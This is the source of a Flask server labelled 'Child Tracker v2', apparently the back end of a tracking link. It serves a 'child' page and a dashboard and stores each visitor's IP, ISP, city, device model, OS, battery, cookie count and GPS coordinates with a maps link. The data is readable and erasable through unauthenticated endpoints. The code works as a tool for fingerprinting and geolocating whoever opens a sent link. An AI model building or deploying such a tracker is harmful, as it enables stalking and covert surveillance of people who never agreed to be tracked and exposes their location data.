from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json, os
from datetime import datetime

app = Flask(__name__, static_folder="static")
CORS(app)

DATA_FILE = "tracked_data.json"


def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return []


def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)


@app.route("/")
@app.route("/child")
def child_page():
    return send_from_directory("static", "child.html")


@app.route("/dashboard")
def dashboard_page():
    return send_from_directory("static", "dashboard.html")


@app.route("/track", methods=["POST"])
def track():
    try:
        payload = request.get_json()

        # ── If this is a location update, merge into the latest matching record ──
        is_location_update = payload.get("location_update", False)
        records = load_data()

        if is_location_update and records:
            # Match by IP + time_opened (same session)
            time_opened = payload.get("time_opened", "")
            ip_address  = payload.get("ip_address", request.remote_addr)
            for rec in records:
                if rec.get("time_opened") == time_opened or rec.get("ip_address") == ip_address:
                    # Merge GPS fields into existing record
                    for key in ["gps_latitude","gps_longitude","gps_accuracy",
                                "gps_altitude","gps_speed","location_type","maps_link",
                                "loc_error"]:
                        if key in payload:
                            rec[key] = payload[key]
                    rec["location_updated_at"] = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
                    save_data(records)
                    print(f"\n[LOCATION UPDATE]")
                    if payload.get("gps_latitude"):
                        print(f"  GPS: {payload.get('gps_latitude')}, {payload.get('gps_longitude')}")
                        print(f"  Accuracy: {payload.get('gps_accuracy')} | Type: {payload.get('location_type')}")
                    else:
                        print(f"  Error: {payload.get('loc_error','Unknown')}")
                    return jsonify({"status": "location_updated"}), 200

        # ── New session record ─────────────────────────────────────────────────
        payload["server_ip"]   = request.remote_addr
        payload["server_time"] = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        payload["headers"] = {
            "User-Agent":      request.headers.get("User-Agent", ""),
            "Accept-Language": request.headers.get("Accept-Language", ""),
        }
        # Remove internal flag if present
        payload.pop("location_update", None)

        records.insert(0, payload)
        save_data(records)

        # Pretty console log
        brand = payload.get("device_brand", "")
        model = payload.get("device_model", "Unknown")
        device_label = f"{brand} {model}".strip() if brand else model

        print(f"\n{'='*55}")
        print(f"  [NEW SESSION]")
        print(f"  Device   : {device_label}")
        print(f"  OS       : {payload.get('os','N/A')}")
        print(f"  IP       : {payload.get('ip_address','N/A')}")
        print(f"  ISP      : {payload.get('isp_name','N/A')}")
        print(f"  City     : {payload.get('city','N/A')}, {payload.get('country','N/A')}")
        print(f"  Network  : {payload.get('network_type','N/A')} | {payload.get('downlink_mbps','N/A')}")
        print(f"  Battery  : {payload.get('battery_level','N/A')} | Charging: {payload.get('battery_charging','N/A')}")
        print(f"  Cookies  : {payload.get('cookies_enabled','N/A')} | Count: {payload.get('cookie_count','N/A')}")
        print(f"{'='*55}")

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/data")
def get_data():
    return jsonify(load_data()), 200


@app.route("/clear", methods=["DELETE"])
def clear():
    save_data([])
    return jsonify({"status": "cleared"}), 200


if __name__ == "__main__":
    os.makedirs("static", exist_ok=True)
    port = int(os.environ.get("PORT", 5000))
    print("=" * 55)
    print("  Child Tracker v2 — ADVANCED")
    print(f"  Server    : http://localhost:{port}")
    print(f"  Child Link: http://localhost:{port}/child")
    print(f"  Dashboard : http://localhost:{port}/dashboard")
    print("=" * 55)
    app.run(debug=False, host="0.0.0.0", port=port)
